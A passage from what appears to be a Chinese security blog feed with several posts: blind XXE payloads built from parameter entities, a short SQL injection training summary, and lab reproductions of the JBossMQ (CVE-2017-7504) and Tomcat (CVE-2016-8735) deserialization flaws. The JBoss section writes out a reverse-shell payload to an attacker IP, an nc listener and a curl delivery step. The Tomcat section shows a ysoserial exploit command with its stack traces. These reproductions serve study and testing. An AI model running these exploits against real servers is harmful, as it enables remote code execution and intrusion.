class="line">%remote-dtd;</span><br></pre></td></tr></table></figure><p>参数实体的定义与文档实体几乎相同，除了附加的”%”符号之外。<br>对参数实体的引用必须出现在DTD中，并且必须使用”%…;”语法。此外，对于在DTD中使用参数实体的上下文，通常会有各种各样的限制。一个重要的限制(在几个XML解析器中一致地出现)是，虽然参数实体可以定义用于引用的DTD语法(例如”%an-element”)，但是它可能不会定义一个立即被用于另一个DTD标记的值。也就是说，这个语法会在我们测试的解析器中失败:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % pm &quot;subtag&quot;&gt;</span><br><span class="line">&lt;!ELEMENT mytag (%pm;)&gt;</span><br></pre></td></tr></table></figure><p>然而，如果实体引用存在于子DTD中，这种样式的语法通常会成功。也就是说，如果文档的DTD引用外部实体，包括使用参数实体引用的外部文档的值，并且外部文档引用前面定义的实体，那么动态构建的DTD标记将被解释为人们所期望的。</p><p>以上是对英文材料的翻译。下面是我的理解。通过将英文文档中的第一例子提交到我们的本地测试靶机，发现没有保存，可以正常打印xml对象，说明解析成功。</p><p><img src="/articles/2018/think-about-blind-xxe-payload/english_article_xml_1.png" alt="英文文章第一例子，可以解析"></p><p>但是第二个就通常可能无法解析。</p><p><img src="/articles/2018/think-about-blind-xxe-payload/english_article_xml_2.png" alt="英文文章第二例子，无法解析"></p><p>文章说第二例子通常是无法解析的，并没有说一定无法解析。说明大部分情况下是无法解析的，因为xml的解析器在php,java,C#等等中情况会有一些不一样。我们暂且认为文章中第二个xml就是无法解析吧！</p><p>按照文章的意思，如果文档的DTD引用外部实体，包括使用参数实体引用的外部文档的值，并且外部文档引用前面定义的实体，那么动态构建的DTD标记将被解释为人们所期望的。</p><p>于是我将第二个xml写为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % pm &quot;subtag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1/remote.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br></pre></td></tr></table></figure><p>remote.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT mytag (%pm;)&gt;</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/think-about-blind-xxe-payload/english_article_xml_3.png" alt="对英文文章第二例子的改正"></p><p>这样之后不在报错。</p><p>现在回到本文的问题，我们想构造的payload其实道理和英文材料中的第二个xml很相似。<br>我们在上面声明% file实体，在下一行就直接通过%file;使用它，按照英文材料的意思这样通常是解析不成功的。那么我们通过<code>错误信息</code>章节中遇到的内部声明<code>&amp;#x25;file</code>可以解析，而外部声明为何无法解析。也许这就是英文材料中说的通常的情况的例外。我承认这解释有点不负责任，没有论证。所以等到有能力可以调式php源码时，才深挖真正的原因吧。</p><p>最后说一下目前的结论吧。虽然一不定是正确的，至少是可以让我能暂时安心睡觉的一个解释。 <strong>payload作者之所以把paylaod内容分两部分写，是因为无法实现分一部分写。分一部分写，无法让payload执行成功！</strong></p><p>该文章关于该问题提出了一些想法。<a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="noopener">XXE漏洞以及Blind XXE总结</a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf" target="_blank" rel="noopener">XML Schema,DTD,and Entity Attacks</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>10分钟总结所有类型SQL注入</title>
      <link href="/articles/2018/summarize-all-types-of-sql-injection/"/>
      <url>/articles/2018/summarize-all-types-of-sql-injection/</url>
      
        <content type="html"><![CDATA[<p>最近在给公司内部培训sql注入。其实很头疼，毕竟sql注入谁都知道，没有什么好讲的。于是一直在思考，这方面我能给大家带来什么干货。毕竟我也不想所有人浪费2个小时听我讲这些已经知道的东西。后来想想也许对于大家来说都知道sql注入，也都了解其原理。但是大家也许并没有对所有的类型进行总结，更不可能从四个维度去梳理sql注入相关知识。于是就有了这篇分享。</p><h2 id="PPT内容分享"><a href="#PPT内容分享" class="headerlink" title="PPT内容分享"></a>PPT内容分享</h2><p>本次分享，尽自己的能力，尽量使用最精简的代码，最简短的poc和最经典的例子给大家快速总结所有类型SQL注入。希望这10分钟，你能对sql注入有整体的了解。</p><p><img src="/articles/2018/summarize-all-types-of-sql-injection/sqli.png" alt="图1-所有类型sql注入总结"></p><center><iframe src="https://myslide.cn/html_player/9125" width="562.5" height="388.25" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="margin-bottom:5px; max-width: 100%;" allowfullscreen></iframe></center><h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>我的这些总结其实启发于阿德马师傅对SQL注入的分类，还有《mysql注入天书》的内容，并结合了自己的一些思考。这些分类还是带有一些主观在里面的，有些也分类也比较有争议。比如堆注入是否属于有回显型的注入，报错注入算不算盲注等问题。只能随着自己对sql注入理解的加深，再来更新PPT。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.nxadmin.com/web/1025.html" target="_blank" rel="noopener">手动SQL注入基础详解</a></p><p><a href="https://github.com/lcamry/sqli-labs" target="_blank" rel="noopener">https://github.com/lcamry/sqli-labs</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞艺术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现JBossMQ JMS Invocation Layer漏洞（CVE-2017-7504）</title>
      <link href="/articles/2018/CVE-2017-7504/"/>
      <url>/articles/2018/CVE-2017-7504/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h2><table><thead><tr><th align="left">项目</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">漏洞名称</td><td align="left">JBossMQ JMS Invocation Layer RCE</td></tr><tr><td align="left">CVE编号</td><td align="left">CVE-2017-7504</td></tr><tr><td align="left">漏洞描述</td><td align="left">HTTPServerILServlet.java在JMS上JbossMQ实现的HTTP调用层，默认情况下在Red Hat Jboss应用服务器&lt;=Jboss 4.X中启用。它不限制执行反序列化的类，允许远程攻击者通过精心设计的序列化数据执行任意代码。</td></tr><tr><td align="left">影响范围</td><td align="left">&lt;= 4.x</td></tr></tbody></table><h2 id="0x02-背景"><a href="#0x02-背景" class="headerlink" title="0x02 背景"></a>0x02 背景</h2><p>前段时间一直在跟大佬好好学习一下中间件那些能getshell的漏洞，特别是反序列化。当时给自己的计划是把以下几个个中间件的漏洞都复现一遍。</p><ul><li>tomcat</li><li>weblogic</li><li>jboss</li><li>websphere</li><li>……</li></ul><p>然而到jboss的<code>JBossMQ JMS Invocation Layer</code>漏洞（CVE-2017-7504）就卡主了。我在windows上搭建好jboss的4.0.0,4.0.5.GA,4.2.3.GA三个版本,使用<a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">JavaDeserH2HC</a>这个exp都无法复现成功。</p><p>看了作者录制的这个视频<a href="https://www.youtube.com/watch?v=jVMr4eeJ2Po" target="_blank" rel="noopener">PoC CVE-2017-7504 - JBossMQ JMS Invocation Layer</a>很多遍了，也没找出什么原因。</p><center><iframe width="854" height="480" src="https://www.youtube.com/embed/jVMr4eeJ2Po" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></center><p>去翻了一下该项目的issues，发现有一个<a href="https://github.com/joaomatosf/JavaDeserH2HC/issues/2" target="_blank" rel="noopener">小哥</a>的情况一模一样，瞬间感觉找到自己人。</p><p><img src="/articles/2018/CVE-2017-7504/issue.jpg" alt></p><p>作者也针对这个问题，说了解决方案是使用POC：<code>ExampleCommonsCollections1WithHashMap.java</code></p><p>然而依然无法成功,想想，应该是需要在linux环境下才行了。当时由于在学习docker，就把这个想法暂时搁浅了。</p><h2 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h2><p>今天有点时间，继续上传没有完成的复现。</p><p>去hub.docker.com，看看有没有适合我的镜像。没有就得自己做了。运气不错，找的了<code>tumux/jboss:as4</code>,制作时间是3年前的，应该是有漏洞的。同时这里给大家一个建议，漏洞复现最好不要使用官方的，官方会随漏洞被披露而更新镜像。</p><p>jboss靶机:192.168.228.154</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/jboss:as4</span><br><span class="line">docker run -p 8080:8080 -it tutum/jboss:as4</span><br></pre></td></tr></table></figure><p>存在漏洞jboss以下路径一定是可以访问的<br><code>http://192.168.228.154:8080/jbossmq-httpil/HTTPServerILServlet/</code></p><p><img src="/articles/2018/CVE-2017-7504/vul_url.png" alt="访问漏洞链接"></p><p>kali攻击机:192.168.228.135</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1 &apos;/bin/bash -i&gt;&amp;/dev/tcp/192.168.228.135/1664&lt;&amp;1&apos;</span><br><span class="line">nc -lvvp 1664</span><br><span class="line">curl http://192.168.154.129:8080:/jbossmq-httpil/HTTPServerILServlet/ --data-binary @ExampleCommonsCollections1.ser</span><br></pre></td></tr></table></figure><h4 id="视频演示"><a href="#视频演示" class="headerlink" title="视频演示"></a>视频演示</h4><center><iframe src="//player.bilibili.com/player.html?aid=24026286&cid=40228669&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="100%" height="556px"> </iframe></center>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> jboss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现tomcat远程代码执行漏洞（CVE-2016-8735）</title>
      <link href="/articles/2018/CVE-2016-8735/"/>
      <url>/articles/2018/CVE-2016-8735/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h2><table><thead><tr><th align="left">项目</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">漏洞名称</td><td align="left">Apache Tomcat Remote Code Execution</td></tr><tr><td align="left">CVE编号</td><td align="left">CVE-2016-8735</td></tr><tr><td align="left">漏洞描述</td><td align="left">Oracle修复了JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。 Tomcat也使用了JmxRemoteLifecycleListener这个监听器,但是Tomcat并没有及时升级，所以存在这个远程代码执行漏洞。</td></tr><tr><td align="left">影响范围</td><td align="left">Apache Tomcat 9.0.0.M1 to 9.0.0.M11<br>Apache Tomcat 8.5.0 to 8.5.6<br>Apache Tomcat 8.0.0.RC1 to 8.0.38<br>Apache Tomcat 7.0.0 to 7.0.72<br>Apache Tomcat 6.0.0 to 6.0.47</td></tr><tr><td align="left">不受影响版本</td><td align="left">Upgrade to Apache Tomcat 9.0.0.M13 or later (Apache Tomcat 9.0.0.M12 has the fix but was not released)<br>Upgrade to Apache Tomcat 8.5.8 or later (Apache Tomcat 8.5.7 has the fix but was not released)<br>Upgrade to Apache Tomcat 8.0.39 or later<br>Upgrade to Apache Tomcat 7.0.73 or later<br>Upgrade to Apache Tomcat 6.0.48 or later</td></tr><tr><td align="left"></td><td align="left"></td></tr><tr><td align="left">## 0x02 漏洞复测</td><td align="left"></td></tr></tbody></table><h4 id="2-1-环境搭建"><a href="#2-1-环境搭建" class="headerlink" title="2.1 环境搭建"></a>2.1 环境搭建</h4><ul><li>操作系统：win7 64位</li><li>java版本:1.7.0_79</li><li>tomcat版本:8.0.36</li></ul><p>在conf/server.xml中添加以下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Listener className=&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot; rmiRegistryPortPlatform=&quot;10001&quot; rmiServerPortPlatform=&quot;10002&quot; /&gt;</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/CVE-2016-8735/web_xml_config.png" alt="图1-修改web.xml"></p><p>然后下载catalina-jmx-remote.jar包和<a href="http://central.maven.org/maven2/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar" target="_blank" rel="noopener">groovy-2.3.9.jar</a>包,放到tomcat的lib目录下。注意：</p><ol><li><p>下载的catalina-jmx-remote.jar要与对应tomcat版本一致，一般这个jar在官方tomcat下载目录的extras文件夹里。</p></li><li><p>下载groovy下载版本最好为2.3.9（经过测试2.3.0到2.4.0-beta-4）</p></li></ol><p>接着修改bin/catalina.bat，在Execute The Requested Command处上面添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false</span><br></pre></td></tr></table></figure><ul><li>-Dcom.sun.management.jmxremote.ssl=false 指定是否使用SSL通讯</li><li>-Dcom.sun.management.jmxremote.authenticate=false 指定是否需要密码验证</li></ul><p><img src="/articles/2018/CVE-2016-8735/catalina_bat_config.png" alt="图2-修改catalina.bat"></p><p>最后运行<code>bin/startup.bat</code>启动tomcat!</p><p><img src="/articles/2018/CVE-2016-8735/tomcat_startup_success.png" alt="图3-tomcat成功启动，10001和10002端口成功开启"></p><h4 id="2-2-利用测试"><a href="#2-2-利用测试" class="headerlink" title="2.2 利用测试"></a>2.2 利用测试</h4><p>使用ysoserial发送payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.228.152 10001 Groovy1 calc.exe</span><br><span class="line">java.lang.ClassCastException: java.lang.ProcessImpl cannot be cast to java.util.Set</span><br><span class="line">        at com.sun.proxy.$Proxy8.entrySet(Unknown Source)</span><br><span class="line">        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:443)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:606)</span><br><span class="line">        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)</span><br><span class="line">        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)</span><br><span class="line">        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)</span><br><span class="line">        at java.util.HashMap.readObject(HashMap.java:1180)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:606)</span><br><span class="line">        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)</span><br><span class="line">        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)</span><br><span class="line">        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1990)</span><br><span class="line">        at java.io.ObjectInputStream.defaultReadObject(ObjectInputStream.java:500)</span><br><span class="line">        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:427)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)</span><br><span class="line">        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">        at java.lang.reflect.Method.invoke(Method.java:606)</span><br><span class="line">        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)</span><br><span class="line">        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)</span><br><span class="line">        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1990)</span><br><span class="line">        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1915)</span><br><span class="line">        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)</span><br><span class="line">        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)</span><br><span class="line">        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)</span><br><span class="line">        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:409)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:267)</span><br><span class="line">        at sun.rmi.transport.Transport$2.run(Transport.java:202)</span><br><span class="line">        at sun.rmi.transport.Transport$2.run(Transport.java:199)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.Transport.serviceCall(Transport.java:198)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:567)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:828)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.access$400(TCPTransport.java:619)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$1.run(TCPTransport.java:684)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$1.run(TCPTransport.java:681)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:681)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:745)</span><br><span class="line">        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(Unknown Source)</span><br><span class="line">        at sun.rmi.transport.StreamRemoteCall.executeCall(Unknown Source)</span><br><span class="line">        at sun.rmi.server.UnicastRef.invoke(Unknown Source)</span><br><span class="line">        at sun.rmi.registry.RegistryImpl_Stub.bind(Unknown Source)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:44)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:38)</span><br><span class="line">        at ysoserial.secmgr.ExecCheckingSecurityManager.wrap(ExecCheckingSecurityManager.java:72)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit.exploit(RMIRegistryExploit.java:38)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit.main(RMIRegistryExploit.java:32)</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/CVE-2016-8735/retest_result.gif" alt="图4-最终效果"></p><h2 id="0x03-存在问题"><a href="#0x03-存在问题" class="headerlink" title="0x03 存在问题"></a>0x03 存在问题</h2><ol><li><p>tomcat相同版本，在java 1.8.0_131下无法弹出计算机。觉得这个漏洞应该还和java版本有关。和groovy版本也有关。</p></li><li><p>发现利用成功报错如上，利用失败时报错如下：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.228.152 10001 Groovy1 calc.exe</span><br><span class="line">java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:</span><br><span class="line">        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:</span><br><span class="line">        java.lang.ClassNotFoundException: org.codehaus.groovy.runtime.ConvertedClosure (no security manager: RMI class loader disabled)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:419)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:267)</span><br><span class="line">        at sun.rmi.transport.Transport$2.run(Transport.java:202)</span><br><span class="line">        at sun.rmi.transport.Transport$2.run(Transport.java:199)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.Transport.serviceCall(Transport.java:198)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:567)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:828)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.access$400(TCPTransport.java:619)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$1.run(TCPTransport.java:684)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$1.run(TCPTransport.java:681)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:681)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:745)</span><br><span class="line">        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(Unknown Source)</span><br><span class="line">        at sun.rmi.transport.StreamRemoteCall.executeCall(Unknown Source)</span><br><span class="line">        at sun.rmi.server.UnicastRef.invoke(Unknown Source)</span><br><span class="line">        at sun.rmi.registry.RegistryImpl_Stub.bind(Unknown Source)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:44)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit$1.call(RMIRegistryExploit.java:38)</span><br><span class="line">        at ysoserial.secmgr.ExecCheckingSecurityManager.wrap(ExecCheckingSecurityManager.java:72)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit.exploit(RMIRegistryExploit.java:38)</span><br><span class="line">        at ysoserial.exploit.RMIRegistryExploit.main(RMIRegistryExploit.java:32)</span><br><span class="line">Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:</span><br><span class="line">        java.lang.ClassNotFoundException: org.codehaus.groovy.runtime.ConvertedClosure (no security manager: RMI class loader disabled)</span><br><span class="line">        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:409)</span><br><span class="line">        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:267)</span><br><span class="line">        at sun.rmi.transport.Transport$2.run(Transport.java:202)</span><br><span class="line">        at sun.rmi.transport.Transport$2.run(Transport.java:199)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.Transport.serviceCall(Transport.java:198)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:567)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:828)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.access$400(TCPTransport.java:619)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$1.run(TCPTransport.java:684)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$1.run(TCPTransport.java:681)</span><br><span class="line">        at java.security.AccessController.doPrivileged(Native Method)</span><br><span class="line">        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:681)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)</span><br><span class="line">        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:745)</span><br><span class="line">Caused by: java.lang.ClassNotFoundException: org.codehaus.groovy.runtime.ConvertedClosure (no security manager: RMI class loader disabled)</span><br><span class="line">        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:393)</span><br><span class="line">        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:185)</span><br><span class="line">        at java.rmi.server.RMIClassLoader$2.loadClass(RMIClassLoader.java:637)</span><br><span class="line">        at java.rmi.server.RMIClassLoader.loadClass(RMIClassLoader.java:264)</span><br><span class="line">        at sun.rmi.server.MarshalInputStream.resolveClass(MarshalInputStream.java:214)</span><br><span class="line">        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1612)</span><br><span class="line">        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1517)</span><br><span class="line">        at 